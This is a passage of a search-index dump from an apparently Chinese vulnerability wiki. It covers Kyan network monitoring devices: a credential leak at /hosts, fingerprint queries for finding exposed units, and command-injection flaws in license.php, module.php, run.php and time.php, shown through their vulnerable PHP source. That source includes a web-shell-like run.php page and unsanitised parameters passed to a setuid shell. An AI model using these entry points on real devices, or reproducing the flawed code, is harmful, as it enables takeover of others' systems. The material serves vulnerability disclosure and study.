","date":"0001-01-01","objectID":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-hosts-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-hosts-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"platform - Login\" ","date":"0001-01-01","objectID":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-hosts-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-hosts-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 POC http://xxx.xxx.xxx.xxx/hosts 成功获得账号密码 ","date":"0001-01-01","objectID":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-hosts-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-hosts-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Kyan 网络监控设备 license.php 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-license.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-license.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Kyan 网络监控设备 license.php 可在身份验证的情况下执行任意命令, 配合账号密码泄露漏洞，可以获取服务器权限，存在远程命令执行漏洞 ","date":"0001-01-01","objectID":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-license.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-license.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Kyan ","date":"0001-01-01","objectID":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-license.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-license.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"Kyan设计\" ","date":"0001-01-01","objectID":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-license.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-license.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 存在漏洞的文件: /license.php \u003c?php require_once 'config.php'; require_once 'functions.php'; require_once 'international.php'; session_start(); auth_check(); $BASH = \"\"; if (is_windows()) { $BASH = \"c:\\\\cygwin\\\\bin\\\\bash --login -c \"; $PREFIX = \"/cygdrive/z/writable/\"; $PREFIX2 = \"/cygdrive/z/\"; } else { $BASH = \"/bin/bashsuid -p -c \"; $PREFIX = \"/config/\"; $PREFIX2 = \"/\"; } $encrypt_key = 'enc@leadmeet'; if ($_SERVER['REQUEST_METHOD'] == 'POST') { if (!isset($_FILES['fileupload'])) { show_error(lang_get('no file specified')); exit; } if ($_FILES['fileupload']['size'] == 0) { show_error(lang_get('file size is zero')); exit; } $fileupload = $_FILES['fileupload']; $destdir = $PREFIX . 'licenses'; $pkg_extract_dir = $PREFIX2 . 'licenses'; $tmpname = $fileupload['tmp_name']; if (is_windows()) { $bn = basename($tmpname); $command = \"move /Y \\\"\". $tmpname . \"\\\" c:\\\\cygwin\\\\dev\\\\shm\\\\\" . $bn; shell_exec($command); $tmpname = \"/dev/shm/\" . $bn; } shell_exec($BASH.\"\\\"mkdir -p /dev/shm/upload \u0026\u0026 chmod -R 777 /dev/shm/ \\\"\"); exec($BASH.\"\\\"cd /dev/shm/upload \u0026\u0026 ( bzcat \" . $tmpname . \" | openssl bf-cbc -d -k \" . $encrypt_key . \" | cpio -idu )\\\"\", $output, $ret); if($ret \u003c\u003e 0) { show_error(lang_get('Extract file failed')); exec($BASH.\"\\\"rm -rf /dev/shm/upload\\\"\"); exit; } exec($BASH.\"\\\"cd /dev/shm/upload \u0026\u0026 md5sum -c md5sum\\\"\", $output, $ret); if($ret \u003c\u003e 0) { show_error(lang_get('MD5 check failed')); exec($BASH.\"\\\"rm -rf /dev/shm/upload\\\"\"); exit; } if (is_windows()) $dh = opendir('c:\\\\cygwin\\\\dev\\\\shm\\\\upload'); else $dh = opendir('/dev/shm/upload'); if(!$dh) { show_error(lang_get('can not open dest dir to copy')); exec($BASH.\"\\\"rm -rf /dev/shm/upload\\\"\"); exit; } exec($BASH.\"\\\"touch /tmp/mmap_watch_pause\\\"\"); while($file = readdir($dh)) { if(is_dir($file)) continue; $file = trim($file); if(ereg('\\.lic$', $file)) { $filetitle = basename($file, '.lic'); $extract_dir = $pkg_extract_dir . '/' . $filetitle; exec($BASH.\"\\\"\" . $extract_dir . \"/.init stop\\\"\"); exec($BASH.\"\\\"mkdir -p \" . $destdir . \" \u0026\u0026 mv -f /dev/shm/upload/\" . $file . \" \" . $destdir . \"\\\"\"); exec($BASH.\"\\\"rm -rf \" . $extract_dir . \" \u0026\u0026 mkdir -p \" . $extract_dir . \" \u0026\u0026 cd \" . $extract_dir . \" \u0026\u0026 bzcat \" . $destdir . '/' . $file . \" | cpio -idu \\\"\"); } } if (!is_windows()) exec($BASH.\"\\\"/sbin/ldconfig\\\"\"); else exec($BASH.\"\\\"rm -rf \". $tmpname .\"\\\"\"); exec($BASH.\"\\\"rm -f /tmp/mmap_watch_pause\\\"\"); exec($BASH.\"\\\"rm -rf /dev/shm/upload\\\"\"); } if (isset($_GET['cmd']) \u0026\u0026 isset($_GET['name'])) { $cmd = $_GET['cmd']; if ($cmd == 'delete') { $name = $_GET['name']; exec($BASH.\"\\\"rm -f \". $PREFIX .\"licenses/\".$name.\"\\\"\"); } } print_html_begin('license'); echo \"\u003ctable style=\\\"width:500px\\\" border='0' align='center' cellpadding='3' cellspacing='1'\u003e\\n\"; echo \"\u003cth colspan=2\u003e\".lang_get('licenses').\"\u003c/th\u003e\\n\"; echo \"\u003ctr\u003e\u003ctd\u003e\".lang_get('name').\"\u003c/td\u003e\u003ctd\u003e\".lang_get('operation').\"\u003c/td\u003e\u003c/tr\u003e\\n\"; if (is_windows()) $dh = opendir('z:\\\\writable\\\\licenses'); else $dh = opendir('/config/licenses'); if ($dh) { while ($file = readdir($dh)) { if (is_dir($file)) continue; $file = trim($file); if (!ereg('\\.lic$', $file)) continue; $filetitle = basename($file, '.lic'); echo \"\u003ctr\u003e\u003ctd align=center\u003e\".$filetitle.\"\u003c/td\u003e\u003ctd\u003e\"; echo \"\u003c/td\u003e\u003c/tr\u003e\\n\"; } } echo \"\u003c/table\u003e\\n\u003cbr\u003e\\n\"; echo \"\u003cbody\u003e\\n\"; echo \"\u003ctable style=\\\"width:500px\\\" border='0' align='center' cellpadding='3' cellspacing='1'\u003e\\n\"; echo \"\u003cform action=\\\"\".$_server['php_self'].\"\\\" method=\\\"post\\\" enctype=\\\"multipart/form-data\\\"\u003e\\n\"; echo \"\u003cinput type=\\\"hidden\\\" name=\\\"max_file_size\\\" value=\\\"200000000\\\"\u003e\\n\"; echo \"\u003cth align=\\\"center\\\" colspan=\\\"2\\\"\u003e\".lang_get('licenses to upload').\"\u003c/th\u003e\"; echo \"\u003ctr class=\\\"tablebody1\\\"\u003e \u003ctd align=\\\"right\\\" width=\\\"50%\\\"\u003e\" .lang_get('select file').\"\u003c/td\u003e\u003ctd align=\\\"left\\\"\u003e \u003cinput type=\\\"file\\\" name=\\\"fileupload\\\"\u003e \u003c/td\u003e\u003c/tr\u003e\"; echo \"\u003ctr class=\\\"tablebody2\\\"\u003e \u003ctd align=\\\"center\\\" colspan=\\\"2\\\"\u003e \u003cinput type=\\\"submit\\\" name=\\\"submit\\\" value=\".lang_get('upload').\"\u003e \u003c/td\u003e\u003c/tr\u003e\"; echo \"\u003c/form\u003e\\n\u003c/table\u003e\\n\"; echo \"\u003c/body\u003e\\n\"; print","date":"0001-01-01","objectID":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-license.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-license.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Kyan 网络监控设备 module.php 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-module.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-module.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Kyan 网络监控设备 module.php 可在身份验证的情况下执行任意命令, 配合账号密码泄露漏洞，可以获取服务器权限，存在远程命令执行漏洞 ","date":"0001-01-01","objectID":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-module.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-module.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Kyan ","date":"0001-01-01","objectID":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-module.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-module.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"Kyan设计\" ","date":"0001-01-01","objectID":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-module.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-module.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 存在漏洞的文件: /module.php \u003c?php require_once 'config.php'; require_once 'functions.php'; require_once 'international.php'; session_start(); auth_check(); $BASH = \"\"; if (is_windows()) { $BASH = \"c:\\\\cygwin\\\\bin\\\\bash --login -c \"; $PREFIX = \"/cygdrive/z/writable/\"; $PREFIX2 = \"/cygdrive/z/\"; } else { $BASH = \"/bin/bashsuid -p -c \"; $PREFIX = \"/config/\"; $PREFIX2 = \"/\"; } $encrypt_key = 'enc@leadmeet'; if ($_SERVER['REQUEST_METHOD'] == 'POST') { if (!isset($_FILES['fileupload'])) { show_error(lang_get('no file specified')); exit; } if ($_FILES['fileupload']['size'] == 0) { show_error(lang_get('file size is zero')); exit; } $fileupload = $_FILES['fileupload']; $destdir = $PREFIX.'pkgs'; $pkg_extract_dir = $PREFIX2.'pkgs'; $tmpname = $fileupload['tmp_name']; if (is_windows()) { $bn = basename($tmpname); $command = \"move /Y \\\"\". $tmpname . \"\\\" c:\\\\cygwin\\\\dev\\\\shm\\\\\" . $bn; shell_exec($command); $tmpname = \"/dev/shm/\" . $bn; } shell_exec($BASH.\"\\\"mkdir -p /dev/shm/upload \u0026\u0026 chmod -R 777 /dev/shm/ \\\"\"); exec($BASH.\"\\\"cd /dev/shm/upload \u0026\u0026 ( bzcat \" . $tmpname . \" | openssl bf-cbc -d -k \" . $encrypt_key . \" | cpio -idu )\\\"\", $output, $ret); if($ret \u003c\u003e 0) { show_error(lang_get('Extract file failed')); exec($BASH.\"\\\"rm -rf /dev/shm/upload\\\"\"); exit; } exec($BASH.\"\\\"cd /dev/shm/upload \u0026\u0026 md5sum -c md5sum\\\"\", $output, $ret); if($ret \u003c\u003e 0) { show_error(lang_get('MD5 check failed')); exec($BASH.\"\\\"rm -rf /dev/shm/upload\\\"\"); exit; } if (is_windows()) $dh = opendir('c:\\\\cygwin\\\\dev\\\\shm\\\\upload'); else $dh = opendir('/dev/shm/upload'); if(!$dh) { show_error(lang_get('can not open dest dir to copy')); exec($BASH.\"\\\"rm -rf /dev/shm/upload\\\"\"); exit; } exec($BASH.\"\\\"touch /tmp/mmap_watch_pause\\\"\"); while($file = readdir($dh)) { if(is_dir($file)) continue; $file = trim($file); if(ereg('\\.pkg$', $file)) { $filetitle = basename($file, '.pkg'); $extract_dir = $pkg_extract_dir . '/' . $filetitle; exec($BASH.\"\\\"\" . $extract_dir . \"/.init stop\\\"\"); exec($BASH.\"\\\"mkdir -p \" . $destdir . \" \u0026\u0026 mv -f /dev/shm/upload/\" . $file . \" \" . $destdir . \"\\\"\"); exec($BASH.\"\\\"rm -rf \" . $extract_dir . \" \u0026\u0026 mkdir -p \" . $extract_dir . \" \u0026\u0026 cd \" . $extract_dir . \" \u0026\u0026 bzcat \" . $destdir . '/' . $file . \" | cpio -idu \\\"\"); } } if (!is_windows()) exec($BASH.\"\\\"/sbin/ldconfig\\\"\"); else exec($BASH.\"\\\"rm -rf \". $tmpname .\"\\\"\"); exec($BASH.\"\\\"rm -f /tmp/mmap_watch_pause\\\"\"); exec($BASH.\"\\\"rm -rf /dev/shm/upload\\\"\"); } if (isset($_GET['cmd']) \u0026\u0026 isset($_GET['name'])) { $cmd = $_GET['cmd']; if ($cmd == 'delete') { $name = $_GET['name']; exec($BASH.\"\\\"rm -f \".$PREFIX.\"pkgs/\".$name.\"\\\"\"); if (is_windows()) exec($BASH.\"\\\"rm -rf \".$PREFIX2.\"pkgs/\".$name.\"\\\"\"); } } print_html_begin('module'); echo \"\u003cbody\u003e\\n\"; echo \"\u003ctable style=\\\"width:500px\\\" border='0' align='center' cellpadding='3' cellspacing='1'\u003e\\n\"; echo \"\u003cth colspan=2\u003e\".lang_get('modules').\"\u003c/th\u003e\\n\"; echo \"\u003ctr\u003e\u003ctd\u003e\".lang_get('name').\"\u003c/td\u003e\u003ctd\u003e\".lang_get('operation').\"\u003c/td\u003e\u003c/tr\u003e\\n\"; if (is_windows()) $dh = opendir('z:\\\\writable\\\\pkgs'); else $dh = opendir('/config/pkgs'); if ($dh) { while ($file = readdir($dh)) { if (is_dir($file)) continue; $file = trim($file); if (!ereg('\\.pkg$', $file)) continue; $filetitle = basename($file, '.pkg'); echo \"\u003ctr\u003e\u003ctd align=center\u003e\".$filetitle.\"\u003c/td\u003e\u003ctd\u003e\"; if (user_is_admin()) echo \"\u003ca href=\\\"/module.php?cmd=delete\u0026name=\".$filetitle.\".pkg\\\"\u003e\".lang_get('delete').\"\u003c/a\u003e\"; echo \"\u003c/td\u003e\u003c/tr\u003e\\n\"; } } echo \"\u003c/table\u003e\\n\u003cbr\u003e\\n\"; echo \"\u003ctable style=\\\"width:500px\\\" border='0' align='center' cellpadding='3' cellspacing='1'\u003e\\n\"; echo \"\u003cform action=\\\"\".$_server['php_self'].\"\\\" method=\\\"post\\\" enctype=\\\"multipart/form-data\\\"\u003e\\n\"; echo \"\u003cinput type=\\\"hidden\\\" name=\\\"max_file_size\\\" value=\\\"200000000\\\"\u003e\\n\"; echo \"\u003cth align=\\\"center\\\" colspan=\\\"2\\\"\u003e\".lang_get('modules to upload').\"\u003c/th\u003e\"; echo \"\u003ctr\u003e \u003ctd align=\\\"right\\\" width=\\\"50%\\\"\u003e\" .lang_get('select file').\"\u003c/td\u003e\u003ctd align=\\\"left\\\"\u003e \u003cinput type=\\\"file\\\" name=\\\"fileupload\\\"\u003e \u003c/td\u003e\u003c/tr\u003e\"; echo \"\u003ctr\u003e \u003ctd align=\\\"center\\\" colspan=\\\"2\\\"\u003e \u003cinput type=\\\"submi","date":"0001-01-01","objectID":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-module.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-module.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Kyan 网络监控设备 run.php 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-run.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-run.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Kyan 网络监控设备 run.php可在身份验证的情况下执行任意命令, 配合账号密码泄露漏洞，可以获取服务器权限，存在远程命令执行漏洞 ","date":"0001-01-01","objectID":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-run.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-run.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Kyan ","date":"0001-01-01","objectID":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-run.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-run.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"platform - Login\" ","date":"0001-01-01","objectID":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-run.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-run.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 使用 Gobuster扫描文件 其中 run.php 文件内容为 \u003c?php require_once 'functions.php'; require_once 'international.php'; session_start(); auth_check(); print_html_begin('run'); ?\u003e \u003cbody link=\"#000000\" vlink=\"#000000\" alink=\"#000000\" bgcolor=\"#FFFFFF\"\u003e \u003cform method=\"post\"\u003e \u003ctable border=\"1\" cellpadding=\"0\" cellspacing=\"0\" style=\"border-collapse: collapse\" width=\"100%\" id=\"AutoNumber1\" height=\"25\" bordercolor=\"#000000\"\u003e \u003ctr\u003e \u003ctd width=\"100%\" height=\"25\" bgcolor=\"#FCFEBA\"\u003e \u003cp align=\"center\"\u003e\u003cfont face=\"Verdana\" size=\"2\"\u003e Shell Execute \u003c/font\u003e\u003c/td\u003e \u003c/tr\u003e \u003ctr\u003e \u003ctd width=\"100%\" height=\"25\" bgcolor=\"#FCFEBA\"\u003e \u003cdiv align=\"center\"\u003e \u003ctextarea name=\"command\" rows=\"2\" cols=\"100\" \u003e\u003c?php echo $_POST['command']; ?\u003e \u003c/textarea\u003e \u003c/div\u003e\u003c/td\u003e \u003c/tr\u003e \u003ctr\u003e \u003ctd width=\"100%\" height=\"25\" bgcolor=\"#FCFEBA\"\u003e \u003cdiv align=\"center\"\u003e \u003cinput type=\"submit\" value=\"Execute\"\u003e \u003c/div\u003e\u003c/td\u003e \u003c/tr\u003e \u003ctr\u003e \u003ctd width=\"100%\" height=\"25\" bgcolor=\"#FCFEBA\"\u003e \u003cdiv align=\"center\"\u003e \u003ctextarea name=\"textarea\" cols=\"100\" rows=\"50\" readonly\u003e\u003c?php @$output = system(trim($_POST['command'])); ?\u003e \u003c/textarea\u003e \u003c/div\u003e\u003c/td\u003e \u003c/tr\u003e \u003c/table\u003e \u003c/form\u003e \u003c/body\u003e \u003c?php print_html_end(); ?\u003e ","date":"0001-01-01","objectID":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-run.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-run.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Kyan 网络监控设备 time.php 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-time.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-time.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Kyan 网络监控设备 time.php 可在身份验证的情况下执行任意命令, 配合账号密码泄露漏洞，可以获取服务器权限，存在远程命令执行漏洞 ","date":"0001-01-01","objectID":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-time.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-time.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Kyan ","date":"0001-01-01","objectID":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-time.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-time.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"Kyan设计\" ","date":"0001-01-01","objectID":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-time.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-time.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 存在漏洞的文件: /time.php \u003c?php require_once 'functions.php'; require_once 'international.php'; session_start(); auth_check(); //showHeader('Route', array('table.css')); if($_SERVER['REQUEST_METHOD'] == 'POST') { if(!user_is_admin()) { showErrMessage(\"permission denied\"); exit; } $timesynctype = $_POST[\"timesynctype\"]; if($timesynctype!=\"client\") { $output = shell_exec(\"/bin/bashsuid -p -c \\\"/usr/sbin/ntpdate \" .$timesynctype. \"\\\"\"); showMessage($output); shell_exec(\"/bin/bashsuid -p -c \\\"hwclock --systohc\\\"\"); }else { $ctime = $_POST[\"ctime\"]; shell_exec(\"/bin/bashsuid -p -c \\\"date \" .$ctime. \"\\\"\"); shell_exec(\"/bin/bashsuid -p -c \\\"hwclock --systohc\\\"\"); } } echo \"\u003chtml xmlns=\\\"http://www.w3.org/1999/xhtml\\\"\u003e\\n\"; echo \" \u003chead\u003e\\n\"; echo \" \u003cmeta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=UTF-8\\\" /\u003e\\n\"; echo \" \u003cmeta http-equiv=\\\"Content-Style-Type\\\" content=\\\"text/css\\\" /\u003e\\n\"; echo \" \u003cmeta http-equiv=\\\"Content-Script-Type\\\" content=\\\"text/javascript\\\" /\u003e\\n\"; echo \" \u003clink type=\\\"text/css\\\" rel=\\\"stylesheet\\\" href=\\\"./templates/clean.css\\\" title=\\\"PSI_Template\\\"/\u003e\\n\"; echo \" \u003ctitle\u003etime\u003c/title\u003e\\n\"; echo \"\u003cstyle type=\\\"text/css\\\"\u003e\"; echo \"th, td, h3 {\"; echo \"font-size: 12px;\"; echo \"}\"; echo \"\u003c/style\u003e\"; echo \" \u003c/head\u003e\\n\"; //print_html_begin(\"time\"); ?\u003e \u003cscript language=\"javascript\" type=\"text/javascript\"\u003e //因程序执行耗费时间,所以时间并不十分准确,误差大约在2000毫秒以下 var xmlHttp = false; //获取服务器时间 try { xmlHttp = new ActiveXObject(\"Msxml2.XMLHTTP\"); } catch (e) { try { 